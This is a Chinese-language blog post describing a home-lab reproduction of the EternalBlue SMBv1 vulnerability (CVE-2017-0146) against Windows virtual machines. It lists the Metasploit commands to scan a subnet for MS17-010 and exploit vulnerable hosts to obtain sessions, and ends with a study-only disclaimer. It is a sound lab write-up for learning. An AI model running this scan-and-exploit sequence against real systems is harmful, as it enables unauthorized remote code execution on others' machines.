---
title: 永恒之蓝的一个简单复现
author: Enomothem
tags:
  - Pentesting
  - CVE-2017-0146
abbrlink: c59b
date: 2020-12-05 22:03:50
---



# [复现 CVE-2017-0146](https://enomothem.cn/2020/12/05/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/)



>有时候，一个人就是一支队伍。



##  Ax 介绍

 Microsoft Windows和Microsoft Windows Server都是美国微软（Microsoft）公司的产品。Microsoft Windows是一套个人设备使用的操作系统。Microsoft Windows Server是一套服务器操作系统。Server Message Block（SMB）Server是其中的一个为计算机提供身份验证用以访问服务器上打印机和文件系统的组件。 Microsoft Windows中的SMBv1服务器存在远程代码执行漏洞。远程攻击者可借助特制的数据包利用该漏洞执行任意代码。以下版本受到影响：Microsoft Windows Vista SP2，Windows Server 2008 SP2和R2 SP1，Windows 7 SP1，Windows 8.1，Windows Server 2012 Gold和R2，Windows RT 8.1，Windows 10 Gold，1511和1607，Windows Server 2016。 

Microsoft Windows SMB 输入验证错误漏洞即永恒之蓝，CVE-2017-0146.


## Bx 准备

Vmware Workstation pro

Windows 7 SP1

Windows Server 2003 

kali Linux 2020.4



## Cx 探测

#### a 打开MSF

``` msfconsole ```

#### b 探测漏洞

``` use auxiliary/scanner/smb/smb_ms17_010```

#### c 设置内网段

``` set rhosts 192.168.66.130/24 ```

#### d 设置线程

```set threads 100 ```

#### e 开始

``` exploit```



![Enomothem](https://s3.ax1x.com/2020/12/06/DO4cnJ.png)


![Enomothem](https://s3.ax1x.com/2020/12/06/DO4j4P.png)



好，扫描到两台可能有漏洞的机器，记住它们两的IP。

## Dx 攻击

#### a 使用攻击模块

```  use exploit/windows/smb/ms17_010_eternalblue ```

#### b 设置IP地址

``` set rhost 192.168.66.130  ```

#### c 因为默认帮我们选择了payload，直接开打

``` exploit``` or ``` run```  		// 我更喜欢用前者



[![Enomothem](https://s3.ax1x.com/2020/12/06/DO5CuQ.md.png)](https://imgchr.com/i/DO5CuQ)

好，成功了，然后返回，我们继续第二个目标

``` background```

``` set rhost 192.168.66.136 ```

```exploit```

[![Enomothem](https://s3.ax1x.com/2020/12/06/DO5iHs.png)](https://imgchr.com/i/DO5iHs)

[![Enomothem](https://s3.ax1x.com/2020/12/06/DO5ANq.png)](https://imgchr.com/i/DO5ANq)

喔嚯，只支持64位的，2003这个假的吧，怎么是32位的。

这不行，开启我的2008，继续攻击。

```set rhost 192.168.66.135 ```

```exploit ```

[![Enomothem](https://s3.ax1x.com/2020/12/06/DO5e3T.png)](https://imgchr.com/i/DO5e3T)

ok.

这样，我们就和两个机器建立了会话了

``` sessions -l ```

[![Enomothem](https://s3.ax1x.com/2020/12/06/DO5mgU.png)](https://imgchr.com/i/DO5mgU)

[![Enomothem](https://s3.ax1x.com/2020/12/06/DO5MDJ.png)](https://imgchr.com/i/DO5MDJ)

[![Enomothem](https://s3.ax1x.com/2020/12/06/DO51ER.png)](https://imgchr.com/i/DO51ER)



## Ex 声明

- 请遵守，爱护《中国网络安全法》。
- 仅供学习参考！
- 请注明出处！



## Fx 参考

[1]《**Pentesting** **Blueprint**》永恒之锋出版（未公开）。

[2]http://vulhub.org.cn/vuln/VHN-98965 漏洞信息库门户。